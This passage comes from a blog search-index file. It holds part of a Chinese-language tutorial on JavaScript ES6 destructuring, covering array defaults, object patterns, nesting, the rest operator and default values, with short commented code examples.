class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> [a = <span class="number">2</span>] = [<span class="literal">undefined</span>]; <span class="comment">// a = 2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//当解构模式有匹配结果，且匹配结果是 undefined 时，会触发默认值作为返回结果。</span></span><br><span class="line"><span class="keyword">let</span> [a = <span class="number">3</span>, b = a] = [];     <span class="comment">// a = 3, b = 3</span></span><br><span class="line"><span class="keyword">let</span> [a = <span class="number">3</span>, b = a] = [<span class="number">1</span>];    <span class="comment">// a = 1, b = 1</span></span><br><span class="line"><span class="keyword">let</span> [a = <span class="number">3</span>, b = a] = [<span class="number">1</span>, <span class="number">2</span>]; <span class="comment">// a = 1, b = 2</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">a 与 b 匹配结果为 undefined ，触发默认值：a = 3; b = a =3</span></span><br><span class="line"><span class="comment">a 正常解构赋值，匹配结果：a = 1，b 匹配结果 undefined ，触发默认值：b = a =1</span></span><br><span class="line"><span class="comment">a 与 b 正常解构赋值，匹配结果：a = 1，b = 2</span></span><br><span class="line"><span class="comment">**/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//总结：有匹配的优先匹配，没有匹配的看默认</span></span><br></pre></td></tr></table></figure><p><a name="U4fzN"></a></p><h2 id="对象模型的解构"><a href="#对象模型的解构" class="headerlink" title="对象模型的解构"></a>对象模型的解构</h2><p><a name="Xpf5k"></a></p><h3 id="基本-1"><a href="#基本-1" class="headerlink" title="基本"></a>基本</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> &#123; foo, bar &#125; = &#123; <span class="attr">foo</span>: <span class="string">&#x27;aaa&#x27;</span>, <span class="attr">bar</span>: <span class="string">&#x27;bbb&#x27;</span> &#125;;</span><br><span class="line"><span class="comment">// foo = &#x27;aaa&#x27;</span></span><br><span class="line"><span class="comment">// bar = &#x27;bbb&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> &#123; baz : foo &#125; = &#123; baz : <span class="string">&#x27;ddd&#x27;</span> &#125;;</span><br><span class="line"><span class="comment">// foo = &#x27;ddd&#x27;</span></span><br></pre></td></tr></table></figure><p><a name="Y8wOM"></a></p><h3 id="可嵌套可忽略"><a href="#可嵌套可忽略" class="headerlink" title="可嵌套可忽略"></a>可嵌套可忽略</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> obj = &#123;<span class="attr">p</span>: [<span class="string">&#x27;hello&#x27;</span>, &#123;<span class="attr">y</span>: <span class="string">&#x27;world&#x27;</span>&#125;] &#125;;</span><br><span class="line"><span class="keyword">let</span> &#123;<span class="attr">p</span>: [x, &#123; y &#125;] &#125; = obj;</span><br><span class="line"><span class="comment">// x = &#x27;hello&#x27;</span></span><br><span class="line"><span class="comment">// y = &#x27;world&#x27;</span></span><br><span class="line"><span class="keyword">let</span> obj = &#123;<span class="attr">p</span>: [<span class="string">&#x27;hello&#x27;</span>, &#123;<span class="attr">y</span>: <span class="string">&#x27;world&#x27;</span>&#125;] &#125;;</span><br><span class="line"><span class="keyword">let</span> &#123;<span class="attr">p</span>: [x, &#123;  &#125;] &#125; = obj;</span><br><span class="line"><span class="comment">// x = &#x27;hello&#x27;</span></span><br></pre></td></tr></table></figure><p><a name="ZhnlL"></a></p><h3 id="不完全解构-1"><a href="#不完全解构-1" class="headerlink" title="不完全解构"></a>不完全解构</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> obj = &#123;<span class="attr">p</span>: [&#123;<span class="attr">y</span>: <span class="string">&#x27;world&#x27;</span>&#125;] &#125;;</span><br><span class="line"><span class="keyword">let</span> &#123;<span class="attr">p</span>: [&#123; y &#125;, x ] &#125; = obj;</span><br><span class="line"><span class="comment">// x = undefined</span></span><br><span class="line"><span class="comment">// y = &#x27;world&#x27;</span></span><br></pre></td></tr></table></figure><p><a name="RlJE6"></a></p><h3 id="剩余运算符-1"><a href="#剩余运算符-1" class="headerlink" title="剩余运算符"></a>剩余运算符</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> &#123;a, b, ...rest&#125; = &#123;<span class="attr">a</span>: <span class="number">10</span>, <span class="attr">b</span>: <span class="number">20</span>, <span class="attr">c</span>: <span class="number">30</span>, <span class="attr">d</span>: <span class="number">40</span>&#125;;</span><br><span class="line"><span class="comment">// a = 10</span></span><br><span class="line"><span class="comment">// b = 20</span></span><br><span class="line"><span class="comment">// rest = &#123;c: 30, d: 40&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><a name="cpMKP"></a></p><h3 id="解构默认值-1"><a href="#解构默认值-1" class="headerlink" title="解构默认值"></a>解构默认值</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> &#123;a = <span class="number">10</span>, b = <span class="number">5</span>&#125; = &#123;<span class="attr">a</span>: <span class="number">3</span>&#125;;</span><br><span class="line"><span class="comment">// a = 3; b = 5;</span></span><br><span class="line"><span class="keyword">let</span> &#123;<span class="attr">a</span>: aa = <span class="number">10</span>, <span class="attr">b</span>: bb = <span class="number">5</span>&#125; = &#123;<span class="attr">a</span>: <span class="number">3</span>&#125;;</span><br><span class="line"><span class="comment">// aa = 3; bb = 5;</span></span><br></pre></td></tr></table></figure><p><a href="https://fangyinghang.com/es-6-tutorials/">https://fangyinghang.com/es-6-tutorials/</a></p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 面试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 面试 </tag>
            
            <tag> js </tag>
            
            <tag> es6 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
